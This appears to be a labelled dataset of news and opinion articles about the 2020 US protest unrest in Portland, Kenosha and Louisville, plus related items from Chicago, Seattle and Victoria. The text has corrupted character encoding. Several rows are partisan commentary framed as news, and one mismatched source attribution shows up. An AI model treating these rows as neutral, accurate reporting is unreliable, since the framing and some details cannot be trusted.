1,"PROTESTS NOT ALLOWED: The Chicago Police Department has banned protests near Mayor Lori Lightfootâ€™s home. REASON: In July protesters rallied near the Mayorâ€™s residence and due to threats she reportedly receives daily, heightened security was put in place. WHY ITâ€™S HYPOCRITICAL: Protests have been allowed to dominate business and residential areas since May. Vandalism of property, arson, blockades, looting, violence, and organized acts of terrorism have all been watched by certain Democrat officials. Often supported without condemnation. Now that the wildfires of anarchy are seemingly uncontrollable, officials that could have and should have stopped it earlier are protected. Yet businesses, properties, and peopleâ€™s daily lives continue to suffer. BANNED: Whatâ€™s most hypocritical is that according to a report, not even peaceful protests are allowed near the Mayorâ€™s home. CHECK OUT: Watch the Portland Mayor protected by private security after the anarchists he stood with surge and get aggressive. Back in July, a report surfaced saying that the police had banned protests from the Logan Square neighborhood, where Mayor Lori Lightfoot lives. It referred to a directive from Melvin Roman, the Shakespeare District Commander, written to officers under his command. It stated that once the order to move was given by police officers, any protesters who remained should be arrested. The directive did not differentiate between peaceful or violent protests. The Mayor should just put signs up saying â€œProtests Not Allowed.â€ CHECK OUT: Mayor on the hunt for criminal mastermind who wrote hate speech on a road sign. The sign read â€œAll Lives Matter.â€ Both the Mayor and Police Chief apologized for the act. Some might say that this move by the Mayor and Chicago Police Department is against the First Amendment, it isnâ€™t. It only seems that way because of the chaos, violence, and ignorance shown by some elected officials. By law, officials can define times and places protests take place. If done so neutrally and reasonably. However, the keyword is peaceful. A violent protest is not legal. CHECK OUT: Child shot by anarchists, at an anarchist barrier that a Mayor was negotiating over. Subscribe: Apple / Google / Spotify / Stitcher / RSS Mayor Lori Lightfoot said: â€œI think that residents of this city, understanding the nature of the threats that we are receiving on a daily basis, on a daily basis, understand I have a right to make sure that my home is secure.â€ If only every resident of Chicago could use taxpayerâ€™s money to make sure their homes, businesses, and property were secure. She continued: â€œIâ€™m not going to make any excuses for the fact that, given the threats I have personally received, given the threats to my home and my family, Iâ€™m going to do everything I can to make sure theyâ€™re protected. I make no apologies whatsoever for that.â€ Remember, this is the Mayor who while the rest of Chicago was in lockdown, was out getting her hair done. It is pure hypocrisy. CHECK OUT: Mayor Lori Lightfoot defied lockdown rules to get hair done uses mob-like tactics to keep churches following the same orders she broke. Share:"
1,"Sign In Manage Newsletters The fall of sexual predator Andrew Cuomo Anti-gun lobbyist David Chipman unsuited to run the ATF Where are the illegal immigrants going? Portland Mayor Ted Wheeler took aim Wednesday at what he called â€œa few dozen individuals engaged in violenceâ€ who he said have allowed the Oregon city to be wrongly portrayed as a â€œdark dystopiaâ€ by President Trump and others. Mr. Wheeler took some of the blame himself, saying he and other leaders have allowed the cityâ€™s reputation for protest to be hijacked by rioters bent on violence, swamping what should have been a thoughtful conversation on racial justice and policing. â€œTheyâ€™re intent on creating mayhem and attacking and harming people, not just property,â€ the mayor said in an online press conference Wednesday night. â€œThatâ€™s a line that we canâ€™t allow our community to cross. Not anymore. Enough is enough.â€ TOP STORIES'Basic human decency': Utah governor urged to change his 'obscene' nameMike Lindell's 2020 election symposium delayed by 'hacked' livestreamNational mile-driven tax pilot program tucked into $1.2 trillion infrastructure bill The mayor is the latest figure on the left to condemn rioting that has started to dominate the racial justice conversation sparked by the death of George Floyd in Minneapolis in May. The final straw appears to have been when rioters brought their violence to his doorstep. After weeks of smashing windows and lighting small fires at police buildings, the federal courthouse and other public offices, protesters marched on Portlandâ€™s city hall Tuesday night, breaking in and scrawling graffiti. Hours later, Mr. Wheeler said it was time to put an end to that side of things. â€œPulling people from their vehicles and beating them in the streets is a horrific, violent crime,â€ he said, describing an assault caught on video from earlier this month, for which a protester has been arrested. Mr. Wheeler, who also serves as police commissioner, rejected demands for a $50 million cut to the police budget as a first step to assuage protesters. He said his goal is to rethink policing and to have the broadest conversation possible. He said heâ€™s been trying to get a sense for the myriad sets of demands from those who are protesting â€” most of whom are peacefully marching, but several hundred of whom nightly pick targets for mayhem. â€œI had a meeting last week where a group of people frankly just shouted expletives at me. That was how they wanted to use their time. I had to end it a little early because my daughter was in the room,â€ Mr. Wheeler said. Mr. Trump this week renewed his call for Oregon Gov. Kate Brown to request him to deploy the National Guard. Ms. Brown, on Twitter, said the stateâ€™s National Guard is fighting forest fires and said Mr. Trump could better use his time trying to assist the state in fighting the coronavirus pandemic. â€œOregon isnâ€™t interested in a role in your political theater,â€ she told the president. But Ms. Brown, a Democrat, also signaled that she, too, is worried that the protests are beginning to stain Portland and the racial justice debate. â€œLet me be clear: Itâ€™s time for the violence and vandalism to end so Portland can focus on the important work to be done to achieve real change for racial justice. Those who have committed acts of violence will be held accountable,â€ she said. Wednesday night, after Mr. Wheeler held his press conference, was the first night this week that police did not declare a riot. That doesnâ€™t mean things were calm. Demonstrators marched on the offices of U.S. Immigration and Customs Enforcement, disabling security cameras, vandalizing the building and pelting federal police with bottles and fist-sized rocks. Demonstrators also tried to blind the officers with lasers. About 200 people were involved, the Portland Police Bureau said. Seeing the violence, the local officers moved in, declaring the gathering an unlawful assembly â€” a level below a riot â€” and pushing the crowd away. The Portland officers said they, too, were pelted with rocks. After theyâ€™d pushed the crowd away from the ICE building, they disengaged, and the protesters started back toward ICE. Portland police say they moved in to make targeted arrests. One protester used pepper spray on police, and a fire was ignited, police said. Local police made 11 arrests, including charging one 26-year-old with unlawful use of pepper spray.  Copyright Â© 2021 The Washington Times, LLC. Click here for reprint permission.

Hall of Fame NFL coach Mike Ditka tripled down on his stance against protests during the National Anthem, once again telling players to â€œgo to another countryâ€ if donâ€™t like the United States. Speaking with Newsmax TV on Monday, the former Chicago Bears coach said that playing professional football is an incredible â€œprivilegeâ€ that few enjoy. â€œFootballâ€™s football. Itâ€™s not a complicated thing. Youâ€™re playing the game, youâ€™re enjoying the game. You donâ€™t like the game, get out of it,â€ Ditka said. â€œItâ€™s not for protesting one way or the other. What color you are, what you think, this or that. You play football. Thatâ€™s it. Youâ€™re privileged. You got a gift from God that you can play the game because you got a body you can do it with. I donâ€™t really understand what youâ€™re protesting. I played the game. I coached the game for a long time. It makes no sense to me.â€ Ditka then advised those players protesting to leave the country if they do not like it here. â€œI would tell those players go to another country and play football there,â€ he said. â€œYou donâ€™t have to come out. You donâ€™t have to come out if you go to another country. You canâ€™t! Because the gameâ€™s only played in this country. And if you canâ€™t respect this country, get the hell out of it.â€ NFL ðŸˆ: Hall-of-Fame coach Mike Ditka tells protesting players that if 'they can't respect this country, get the hell out of it.'

Over the summer, at the height of the Black Lives Matter protests, Ditka repeated this sentiment. â€œIf you canâ€™t respect our national anthem, get the hell out of the country. Thatâ€™s the way I feel. Of course, Iâ€™m old fashioned, so Iâ€™m only going to say what I feel,â€ said Ditka. â€œI think thereâ€™s a way you protest and a way you donâ€™t protest. You donâ€™t protest against the flag and you donâ€™t protest against this country whoâ€™s given you the opportunity to make a living playing a sport that you never thought would happen. So, I donâ€™t want to hear all the crap. You wanna try it, try it. You donâ€™t, itâ€™s okay.â€ As The Daily Wire reported last week, ratings for the NFL season opener for Thursday Night Football were markedly lower than those of the previous year, though itâ€™s not clear if anti-racism and anti-police brutality protests played into the decline in viewership. â€œThe Super Bowl champion Kansas City Chiefsâ€™ 34-20 victory over the Houston Texans averaged about 19.3 million viewers on NBC, according to preliminary ratings,â€ reported The Hollywood Reporter. â€œThatâ€™s down about 13 percent from the 22.12 million who watched last yearâ€™s kickoff, but ahead of the 19 million who tuned in for the 2018 kickoff.â€ RELATED: WATCH: Mike Ditka On Kneeling During Anthem: â€˜If You Canâ€™t Respect Our National Anthem, Get The Hell Out Of The Countryâ€™ The Daily Wire is one of Americaâ€™s fastest-growing conservative media companies and counter-cultural outlets for news, opinion, and entertainment.

1,"Unrest in Kenosha, Wisconsin, cost the city an estimated $2 million to city property alone, according to one city official who believes, by the end of an ongoing assessment, the cost will be much higher. â€œThe cityâ€™s public works director, Shelly Billingsley, provided the estimate to local leaders Monday night on what it would cost to replace garbage trucks, street lights, and traffic signals, among other things that were destroyed or damaged in the unrest over the last week,â€ ABC News reported Tuesday. The city is insured, but as Minneapolis, Minnesota, residents are now finding out, insurance coverage for riot damage is limited, according to the Minneapolis Star-Tribune, where â€œdozensâ€ of business owners are now finding out that demolition costs, particularly, wonâ€™t be reimbursed in full. The damage to city services may also hinder Kenoshaâ€™s public works department in the long term. According to Billingsley, the garbage and utility trucks that were destroyed or damaged in the riots that followed an officer-involved shooting that left 29-year-old Jacob Blake in critical condition, function as snowplows in the winter, and the city may not be able to replace them before the first snowfall which, in Wisconsin, could come as early as October. Those trucks â€œwere parked downtown to provide security and limit movement by protesters, were set on fire during the demonstrations.â€ Kenoshaâ€™s mayor said Monday that he plans on asking the state and federal governments for assistance, and his initial request is $30 million, with the understanding that that number could climb significantly. Individual businesses, now picking up the pieces following three nights of nearly unrestricted rioting, looting, and arson, are also finding that the cost to rebuild may be more than anticipated. According to Fox Business, the used car dealership that rioters burned during the first night of unrest, sustained $1.5 million in damages by itself. â€œThe owners of Car Source in Kenosha told local affiliate FOX 6 Milwaukee the business suffered $500,000 in property damage plus between $900,000 and $1 million in inventory damage during the first night of civil unrest following the police shooting of Jacob Blake, a 29-year-old Black man,â€ the outlet reported. â€œMore than 50 cars were reported to have been damaged in the early Monday morning blaze.â€ â€œAnother local business, Daleâ€™s Jewelry, lost $200,000 worth of jewelry and incurred another $200,000 in property damage,â€ Fox 6 Milwaukee added. Thatâ€™s just the beginning. Local media reports include information about dozens of businesses affected by the unrest, and more than a dozen internet fundraisers, designed to help family-owned businesses recover and eventually rebuild, are now active. President Donald Trump, defying requests by the Wisconsin governor and other Democratic officials to stay away from the riot-torn area, will tour Kenosha on Tuesday and survey the extensive damage left from last weekâ€™s unrest. His opponent, Democratic 2020 presidential nominee, Joe Biden, addressed the riots in a speech on Monday but neglected to condemn the violence specifically, instead opting to blame Trumpâ€™s rhetoric for ongoing, national demonstrations and subsequent damage.

1,"'They can't stop the Church of Christ from worshipping' The city government in Seattle closed down a public park ahead of a planned Christian prayer rally, so the supporters held a ""worship protest"" service outside of the fences installed at the park instead.  Organizers planned the worship service at Gas Works Park on Labor Day, but the city said it would shut the service down ""due to anticipated crowding that could impact the public health of residents,"" over the coronavirus pandemic.  ""Seattle Parks and Recreation does not allow unpermitted public events to take place in Seattle parks and asks the public continue to adhere to current public health guidelines so that we can keep our parks open,"" the city added. Sean Feucht Ministries condemned the decision and called out the city's hypocrisy on political rallies. ""This is the height of hypocrisy for the City of Seattle to turn a blind eye to riots, looting, and AntiFa, while refusing to let Christians gather in a public park to sing and worship,"" said Feucht in a statement on Facebook. ""First the government shuts down churches. Now it's shutting down parks to stop us from worshipping. Time to stand up church!"" he added. Hundreds of his supporters heeded the call and showed up on Monday to the ""protest worship"" service.

1,"Police said ""fire bombs"" were thrown at officers during the protest overnight. Tensions boil over during protests on both coasts The 100th consecutive night of protests in Portland quickly escalated into a riot Saturday as people hurled ""multiple fire bombs, mortars, rocks and other items"" at officers, police said. One of the homemade bombs caught a community member on fire. Medics offered treatment at the scene, and the injured individual was later taken to a hospital by a private vehicle, according to a press release from the Portland Police Bureau. ""This criminal activity presented an extreme danger to life safety for all community members, and prompted a declaration of a riot,"" the law enforcement agency said in a statement early Sunday. More than 50 people were arrested overnight, including at least two who were clad in body armor. One individual was armed with a dagger while another had a knife, police said. The names of those arrested and their charges were not immediately released. Video posted on social media shows what appears to be a Molotov cocktail being thrown into the middle of crowd and exploding into flames on a residential street. One person's legs appears to catch fire as they run away. The video shows police in riot gear using flash-bang grenades while making loudspeaker announcements, ordering people to disperse the area. Some demonstrators are seen setting off fireworks in the street as police advance. A sergeant was struck by a commercial-grade firework, which burned through his glove and injured his hand, according to the Portland Police Bureau. Several other law enforcement officers were hit by rocks in the head, arms, shoulders and feet, with only their protective gear preventing serious injury, police said. Meanwhile, an Oregon State Police vehicle was damaged by rocks, including broken windows and dents. The Portland Police Bureau said ""it was clear that the intent of the crowd was not peaceful protest,"" as many people were carrying large shields and were dressed in protective gear, including helmets, gas masks and body armor. The unrest in Oregon's largest city erupted following the May 25 death of George Floyd, an unarmed 46-year-old Black man who died in Minneapolis after a white police officer was filmed kneeling on his neck as three other officers watched. Protests in cities across the United States and around the world are calling for an end to police brutality and racial injustice. Many of the recent demonstrations in Portland have ended in arson, vandalism and violence. Hundreds of protesters have been arrested by authorities there since late May, according to The Associated Press. Twenty-seven people were arrested following a march Friday night, according to police, who accused protesters of throwing rocks at officers and chanting ""burn it down"" outside the offices of the Portland Police Association. Last weekend, a pro-Trump supporter was shot to death during dueling demonstrations in downtown Portland. The suspected gunman was killed during an encounter with authorities Thursday. 24/7 coverage of breaking news and live events"
1,"Amid several violent Black Lives Matter protests on Wednesday, Democrat vice presidential candidate Sen. Kamala Harris (CA) seemingly encouraged the activists to continue their demonstrations. The protests broke out Wednesday evening in Louisville and later other cities across the nation after a Kentucky grand jury did not bring murder charges against the officers involved in the shooting death of Breonna Taylor. â€œTonight, Iâ€™m thinking of Breonna Taylorâ€™s family who is still grieving the loss of a daughter and sister,â€ Harris wrote.

1,"Advertisement Supported by The protests are moving into white residential neighborhoods, where activists demand that people choose a side. By Nellie Bowles PORTLAND, Ore. â€” Terrance Moses was watching protesters against police brutality march down his quiet residential street one recent evening when some in the group of a few hundred suddenly stopped and started yelling. Mr. Moses was initially not sure what the protesters were upset about, but as he got closer, he saw it: His neighbors had an American flag on display. â€œIt went from a peaceful march, calling out the names, to all of a sudden, bang, â€˜How dare you fly the American flag?â€™â€ said Mr. Moses, who is Black and runs a nonprofit group in the Portland, Ore., area. â€œThey said take it down. They wouldnâ€™t leave. They said theyâ€™re going to come back and burn the house down.â€ Mr. Moses and others blocked the demonstrators and told them to leave. â€œWe donâ€™t go around terrorizing folks to try and force them to do something they donâ€™t want to do,â€ said Mr. Moses, whose nonprofit group provides support for local homeless people. â€œIâ€™m a veteran. Iâ€™m for these liberties.â€ Nearly four months after the killing of George Floyd by the Minneapolis police, some protesters against police brutality are taking a more confrontational â€” and personal â€” approach. The marches in Portland are increasingly moving to residential and largely white neighborhoods, where demonstrators with bullhorns shout for people to come â€œout of your house and into the streetâ€ and demonstrate their support. These more aggressive protests target ordinary people going about their lives, especially those who decline to demonstrate allegiance to the cause. That includes a diner in Washington who refused to raise her fist to show support for Black Lives Matter, or, in several cities, confused drivers who happened upon the protests. But the tactics are dividing supporters of Black Lives Matter, with some worried that the confrontational approach will antagonize people who would be otherwise be receptive to the message, or play into conservativesâ€™ critique of the protests, which have been largely nonviolent nationally. Others, frustrated that little has changed since Mr. Floyd was killed, say that sitting idly and watching a protest without participating nowadays is to show tacit support for racism. â€œWe donâ€™t need allies anymore,â€ said Stephen Green, an investor and entrepreneur in Portland who is Black. â€œWe need accomplices.â€ In Rochester, N.Y., protesters have confronted people at outdoor restaurants, shaking dinner tables. Marchers in Washington also accosted people eating outside, urging everyone to raise their fists to show their allegiance to the movement. The more personal tactics echo those being used against elected officials, with activists showing up not only outside mayorâ€™s offices but their homes as well. The apartment building where the mayor of Portland lives has been vandalized. Protesters lit fires outside, ignited fireworks and broke into one of the businesses in the building on his birthday. In San Jose, Calif., demonstrators graffitied and egged the mayorâ€™s house and lit an American flag in front of it, according to the police. In Rochester, people have recently posted police officersâ€™ home addresses and information about their families, according to a police spokeswoman. In Portland, Jessie Burke, a local business owner who has Chinese ancestry and identifies as biracial, said the message of the movement was getting lost as the protests escalate and target ordinary residents in their homes. â€œEveryone was looking for solutions at first, but now itâ€™s just a nightly fight that has gotten progressively more violent â€” and every neighborhood worries that the fight will come to their neighborhood,â€ Ms. Burke said. â€œItâ€™s: â€˜Wake up, wake up, you need to be in the street protesting if you stand for this.â€™â€ Still, Mr. Green argued that the tactics were working, even as they inconvenienced him and his family. He described the smell of tear gas and wail of sirens as the marches came to his neighborhood, which he said kept his 7-year-old daughter awake. â€œItâ€™s one thing if you can see something on TV, but if you can hear it and you can smell it in your house, that brings it home,â€ said Mr. Green, who grew up in Portland. â€œWe need people willing to say, â€˜Iâ€™m down to lose this friend because stuff needs to change. Iâ€™m down to make my neighbor uncomfortable.â€™ Being nice wasnâ€™t changing anything.â€ Lindsey E. Murphy agreed. She marched with the protesters through one of Portlandâ€™s wealthiest neighborhoods on a recent night and found it deeply moving. She watched white demonstrators shouting at white residents that Black lives matter â€” and the residents joining in with the chant. â€œThe crowd was â€” I wonâ€™t even say mostly white â€” Iâ€™ll say it was an almost exclusively white crowd marching through the whitest neighborhood in Portland shouting â€˜Black lives matterâ€™ and â€˜Black lives are magic,â€™â€ said Ms. Murphy, who is Black and hosts an educational childrenâ€™s YouTube series. â€œWhat I was witnessing was a lamenting prayer, a cry of remorse and shame among the white people. Thatâ€™s what I saw. It was healing.â€ The American flag that generated controversy is displayed in Kenton, a neighborhood of Portland with small bungalows, lush front gardens and ripe fruit trees. Weeks after the confrontation, the husband and wife who fly the flag said they were fearful of retaliation from the roving protesters, who had found their phone number. But they say they will not be intimidated into removing the flag. â€œI will not take my flag down,â€ said the husband, who declined to provide his name in a brief interview. The same night the protesters came to the coupleâ€™s door last month, they marched into Kentonâ€™s commercial district and used restaurant picnic tables as fuel for fires. They collected the colorful wooden dividers the neighbors had recently built for outdoor dining and set those ablaze as well. Mr. Moses and others in the community ran into the protests with fire extinguishers. Protesters that night broke into the Portland Police Association building and set it on fire. A man was later seen scrubbing the sidewalk graffiti â€” a popular message was â€œPPB = KKK,â€ meaning that the Portland Police Bureau is the Ku Klux Klan. Mr. Green said that he opposed the destruction of property, but that he also understood it. And he believes, generally, that the more direct protest tactics in residential areas are working because they make the movement more personal, and reveal who truly supports change. If someone is against the movement, they keep their lights off or refuse to raise their fist, he said, adding that taking the debate into homes and to families is essential. Some residents in Portland say the tactics are escalating as the protests become increasingly dominated by white people, including anarchists and supporters of antifa, the diffuse collection of militant left-wing activists that has a strong presence in the region. The movement is splintered in Portland between more mainstream Black Lives Matter marches and the more aggressive, sometimes chaotic antifa or black bloc protests, where demonstrators dress in black and wear motorcycle helmets or ski masks to make it difficult to identify â€” or later prosecute â€” them. One night this month, there were two protests promoted on the Black Lives Matter Portland Events page: a â€œnonviolent protestâ€ in the city center and â€œan autonomously organized direct action march.â€ No one appeared to be at the city center protest. But around 200 people were at the other event. They gathered in an unlit park in a residential neighborhood around 8 p.m. Everyone wore black, including some protesters who had on body armor and motorcycle helmets. They hastily set up picnic tables and supply booths in the dark, using cellphones for light to showcase their goods. There was a food table overflowing with protein bars and Monster energy drinks. A small free literature selection was set up on the grass and overseen by three people in ski masks. It was a popular offering, and people crowded around, craning to see the pamphlets. Titles included â€œWhy Break Windowsâ€; â€œI Want To Kill Cops Until Iâ€™m Deadâ€; â€œPiece Now, Peace Later: An Anarchist Introduction to Firearmsâ€; â€œIn Defense of Smashing Camerasâ€; and â€œThree-Way Fight: Revolutionary Anti-Fascism and Armed Self Defense.â€ The energy was something like a carnival in the dark. â€œPaint balloons, get your paint balloons,â€ someone barked. But around 9:30, the group was in some organizational chaos. They had decided that the neighborhood close by was too racially diverse for them to protest in. They needed to go somewhere whiter. So the protesters caravaned 20 minutes away to Alberta, a more affluent neighborhood that began being gentrified in the 1990s. They reassembled and marched through the streets. Neighbors in impressive Craftsman-style homes pulled down their shades and turned off their lights, though many could be seen peering out of dark windows. One woman stepped out of an expansive home looking angry; upon seeing the crowd, she quickly retreated indoors. A few young couples stood in their doorways. A Black woman driving past honked and cheered. One white man stepped onto his patio clapping and hollering in support of the passing march. The group called for him to join. He smiled and waved them on, still clapping. They began to chant that he was spineless. He looked worried. But the march moved along, and he went back into his house. â€œYouâ€™ll never sleep tight, we do this every night,â€ the protesters chanted. Advertisement"
1,"Discussing Wednesdayâ€™s violent protests in Louisville, Democrat Kentucky Governor Andy Beshear said Thursday that â€œ99.99% of people could be doing it rightâ€ â€“ then turned his comments to the threat of â€œwhite supremacy groups or militias also marching into town.â€ On Wednesday, two police officers were shot and a total of 143 people were arrested as mobs took to the streets to protest a grand juryâ€™s decision in the case of the police-related shooting death of Breonna Taylor, Kentuckyâ€™s Courier-Journal reports: Louisville police arrested 127 people during Wednesday protests following the announcement that just one of three Louisville Metro Police officers who fired shots in Breonna Taylor's apartment will be criminally charged, and one suspect was arrested after LMPD officials said two officers were shot that night. â€¦ An additional 16 arrests were made downtown during the day, as department spokesman Lamont Washington said protesters moved a barricade at Sixth and Market streets to allow vehicles on to a closed downtown road before damaging multiple city vehicles. But, in an interview Thursday with The Courier-Journal, Kentucky Gov. Beshear not only suggested the protesters were 99% peaceful, he also warned of the threat of white supremacist groups and militias â€œmarching into townâ€ during the protests: ""What we saw last night is that 99.99% of people could be doing it right, but one person who wants to do the wrong thing can mar what is otherwise a nonviolent night where people are expressing how they feel,"" Beshear said of the protests in Louisville Wednesday. ""When we see white supremacy groups or militias also marching into town, it just shows that we need to make sure that we have the appropriate levels of peace officers in place to ensure that we can protect everyone and ensure that people are able to express themselves while being able to do it in a safe way,"" he continued.

1,"Police in Australia arrested a 28-year-old woman on Wednesday for publishing a Facebook post that promotes an anti-lockdown protest in the countryâ€™s state of Victoria. Footage of the arrest was captured by her partner and shows police officers handcuffing the woman and saying that sheâ€™s being charged with â€œincitement.â€ The womanâ€™s phone and computers were also seized. The video, which was livestreamed on Facebook, has gone viral and shows the police eventually taking possession of the phone that was broadcasting the encounter. Over two million people have watched the video so far. â€œItâ€™s in relation to a Facebook post, in relation to a lockdown protest you put on just that day,â€ detective Adrian Smith with the Victorian Police told the woman as she was handcuffed in her home. â€œI wasnâ€™t breaking any laws by doing that,â€ the woman said, explaining that she had an ultrasound scheduled in an hour because sheâ€™s pregnant. â€œYou are actually. You are breaking the law,â€ Smith responded. â€œThatâ€™s why Iâ€™m arresting you.â€ The woman and her partner, who reportedly live in the city of Ballarat, according to Australiaâ€™s ABC News, can be heard on the video offering to take the Facebook post down. But the detective insists that she needs to be arrested because she â€œalready committed the offense.â€ The arrest appears to have involved at least four officers. â€œIâ€™m happy to delete the post, this is ridiculous,â€ the woman said, pleading with the cops and noting that her two children are watching her get arrested. Victoria, which includes the city of Melbourne, has been under strict lockdown measures for the past month after a covid-19 outbreak caused an alarming spike in deaths. Police in Australia have arrested numerous people whoâ€™ve tried to stage protests against the lockdown, but this is the first known instance of someone in Australia being arrested for merely posting about a protest on Facebook. â€œThe search warrant entitles usâ€”and weâ€™re required toâ€”seize any computers, any mobile devices you have,â€ Detective Smith says. â€œI didnâ€™t realize I was doing anything wrong. This is ridiculous,â€ the woman says. The woman can be seen getting very distressed as it becomes clear that sheâ€™s really being taken into custody and the detective barks â€œlet me finish,â€ as he explains what the arrest warrant allows him to take. â€œAny mobile telephone youâ€™ve got, okay?â€ Smith says, before the police turn their attention to the phone thatâ€™s broadcasting on Facebook. The Victoria Police Department issued a statement to Australiaâ€™s ABC News, saying that â€œAny gathering of this nature is in blatant breach of the Chief Health Officerâ€™s directions and puts Victorian lives at risk.â€ â€œThose still thinking of attending the protest [â€¦] can expect a swift and firm response from police,â€ the statement continues. â€œWe will have no hesitation in issuing $1,652 fines to anyone who is breaching the restrictions on the day, or making arrests if necessary.â€ The detective in the video, identified as Adrian Smith by the badge around his neck, appears to have been with Victorian Police since 2001, according to a profile on LinkedIn. Australia remains the only wealthy democracy in the world that doesnâ€™t have anything equivalent to Americaâ€™s First Amendment protections for free speech. And even though itâ€™s clear lockdowns are sometimes necessary to defeat this global pandemic, itâ€™s hard to justify arresting someone and seizing all of their electronics simply for posting about a protest on Facebook. This will likely only inspire covid-deniers to become more ridiculous and radicalized than they already are. Far-right goons on Rupert Murdochâ€™s TV station Sky News Australia have been complaining for months that many actions to fight the covid-19 pandemic have been too extreme. And in this case, they might finally be right. â€œ...itâ€™s hard to justify arresting someone and seizing all of their electronics simply for posting about a protest on Facebook.â€ Maybe not so hard - itâ€™s an incitement to behavior that is counter to the health of the population during a pandemic. Victoria has been under strict lockdown for a month and she is advocating breaking the rules (or laws in this case). fb has a broader reach, so 2 million views occurred instead of a few at some illegal protest gathering. â€œOh. I didnâ€™t know!â€"

1,"Portland, Oregon, police offices debuted a new set of tactics Monday night, controlling protests before they turned violent and arresting suspected â€œanti-fascistâ€ operatives when the smaller march threatened destruction. The techniques took Portlandâ€™s protest movement by surprise, Oregon Lives reports, and left some demonstrators angry and confused, as an increased number of black-clad marchers ended up in police custody. Portlandâ€™s neighborhoods have suffered from ongoing unrest since late May. Until late August, though, much of the violence and destruction was contained to Portlandâ€™s city center, with a federal courthouse as riotersâ€™ top target. There, protesters tangled with an elite group of Customs and Border Protection Agents sent in to protect federal property. After the Department of Homeland Security withdrew their troops, protests moved to Portlandâ€™s residential neighborhoods, and Portlandâ€™s police department has been struggling to contain the unrest, often waiting until a demonstration becomes destructive before beginning the process of clearing streets and detaining individual marchers. Over the weekend, violence came to a head, protesters clashed with police and â€œdozensâ€ were arrested â€œamid the protests in Portland included one juvenile and people from outside of Oregon, including California, Canada, Minnesota, Washington, and Texas, the Multnomah Co. Sheriffâ€™s Office said Monday,â€ according to Fox News. The confrontations triggered Oregonâ€™s Democrat Gov. Kate Brown to press Portland law enforcement to investigate â€œany alleged incidentsâ€ involving officers for signs of police brutality. Monday night, the Portland Police struck first, declaring a planned march to a police administration building â€œunlawful,â€ moving through the protestersâ€™ camp, and confiscating materials typically used in riots. â€œSeveral dozen Portland police moved on protesters gathering in a North Portland park Monday night even before the group started marching,â€ Oregon Live reported Tuesday. â€œThe armored officers swept through the park, confiscating homemade shields and other articles. A scuffle broke out when officers tried to confiscate a picket sign that read â€œvote,â€ multiple videos from the scene showed, and at least one person was detained. Police also deployed pepper spray.â€ The raid delayed the march and splintered it into smaller, more manageable factions. When demonstrators eventually regrouped, police immediately declared sidewalks and public roads off-limits. Eventually, Portland police declared the march an â€œunlawful assemblyâ€ and began arresting those suspected of inciting violence. â€œTwenty-four people were ultimately arrested. The vast majority are accused of interfering with a peace officer, disorderly conduct, or both charges,â€ Oregon Live added. Although the scene became chaotic, for the first time in several weeks, protesters were unable to set the police administration building on fire. Oregon Live notes that Portland police expect that all 24 individuals arrested will be back on the street Tuesday night, given that the Portland District Attorney will not prosecute protesters for small crimes like â€œinterfering with a peace officerâ€ or â€œdisorderly conduct.â€ In some extreme cases, Oregon State Police, also involved in nightly crowed control, can refer certain protesters for Federal prosecution â€” as The Daily Wire earlier this month, the Oregon State Police were deputized by DHS â€” but those cases are rare.

1,"MINNEAPOLIS (WCCO) â€” People are protesting in Louisville, the Twin Cities and across the United States Wednesday after a grand jury announced its decision in the police shooting death of Breonna Taylor. In Minnesota, activists say they are prepared for the long fight against injustice. Protesters rallied at the Minnesota State Capitol Wednesday evening in a collective call for justice for Taylorâ€™s family, and a conviction for former officer Brett Hankison. They are coming down the ramp closing highway 94 East in Saint Paul pic.twitter.com/9I2J3hg4y1 â€” Dymanh Chhoun (@Dymanh) September 24, 2020  Demonstrators then began marching down University Avenue, before dozens walked onto Interstate 94 in St. Paul after 8 p.m., closing both directions until about 8:40 p.m. (credit: CBS) Minnesota State Patrol squad cars were seen escorting small buses onto the highway, which may have been in preparation for arresting people who didnâ€™t disperse. It is unclear as of late Wednesday night if anyone was taken into custody. After a day of protests in Louisville, rioters started setting fires in the streets at night. CBS News reports that two Louisville police officers were shot, but it is not clear if it was connected to the protests. The grand jury charged Hankison with three counts of wanton endangerment. The charges against him were for shooting into neighboring apartments, not directly related to Taylorâ€™s death. Louisville Police shot the 26-year-old EMT in March while executing a no-knock warrant at her apartment during a narcotics investigation. Taylorâ€™s boyfriend fired one shot at police, saying he believed they were intruders. Three officers returned fire, killing Taylor. No drugs were ever found in her home. â€œThe decision before my office as the special prosecutor in this case is not to decide if the loss of Miss Taylorâ€™s life is a tragedy. The answer to that question unequivocally is yes,â€ Kentucky Attorney General Daniel Cameron said. Many in Minnesota, where George Floyd died while being restrained by Minneapolis police officers on Memorial Day, say the grand juryâ€™s decision to charge only one of the three officers involved is not justice for Taylorâ€™s family. Some took to social media to express their concerns over the decision to charge Hankison, but not the other two officers, who still work for the Louisville Police Department. â€œI think it was a compromise â€¦ brought to bear by the protest and national protest, and they felt like they have to do something,â€ community activist Mel Reeves, who founded the Twin Cities Coalition for Justice 4 Jamar, said. â€œThe whole thing is just a mess, and again itâ€™s proof positive the system and the way that they do criminal justice is just wrong.â€ Reeves says itâ€™s infuriating that the life of the aspiring nurse is not worth charging the people who he says are responsible for her death. â€œI think the other two people should have been charged with endangering her life as well, reckless endangerment of some kind,â€ Reeves said. He says activists across the country are digging in their heels, ready to take a stand against a system that he and others believe is not fair. For now they rally, march and try and change laws, seeking to create a system that has equal treatment for all. Last week, the city of Louisville agreed to pay Taylorâ€™s family $12 million to settle a civil lawsuit, the most the city has ever paid in a police misconduct case. The mayor also pledged police reforms, including an overhaul of search warrant procedures. The familyâ€™s attorney called Wednesdayâ€™s decision outrageous and offensive."
1,"A top aide to Oregon's House speaker was arrested for interfering with a police officer during the riots in Portland. Kristina Narayan was arrested on Sunday around 2:07 a.m. Pacific time for interfering with a peace officer after the demonstration had been declared a riot and participants were ordered to clear the area, according to the Maricopa County Sheriff's Office. ""Kristina Narayan was arrested for Interfering with a Police Officer after the event became a riot and the crowd was given multiple orders to disperse, which she did not do,â€ said Officer Derek Carmon, a Portland Police Bureau spokesman, in a statement to the Hill. Narayan is the legislative director for Oregon House Speaker Tina Kotek, according to a report from the Washington Free Beacon. Narayan has worked for Kotek, a Democrat, since 2016. Her LinkedIn account states that she has been a legislative director in the office since May 2018. Narayan is also listed as a legislative director on Kotek's official website. The Washington Examiner has reached out to Kotek's office for comment. At least 58 other people were arrested during the riot on Saturday night and Sunday morning, according to a press release from the Portland Police Bureau. ""Multiple fire bombs, mortars, rocks, and other items"" were thrown at officers as they attempted to disperse the crowd, police said. Portland has been the scene of consecutive protests and riots for more than 100 days. Kotek, who represents 